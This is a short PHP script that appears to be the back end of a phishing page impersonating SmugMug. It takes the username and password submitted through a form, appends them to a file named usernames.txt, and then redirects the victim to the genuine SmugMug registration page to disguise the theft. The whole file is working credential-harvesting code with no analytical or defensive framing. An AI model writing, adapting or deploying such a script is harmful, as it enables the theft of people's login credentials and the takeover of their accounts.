<?php

file_put_contents("usernames.txt", "smugmug Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.smugmug.com/signup/registration');
exit();
?>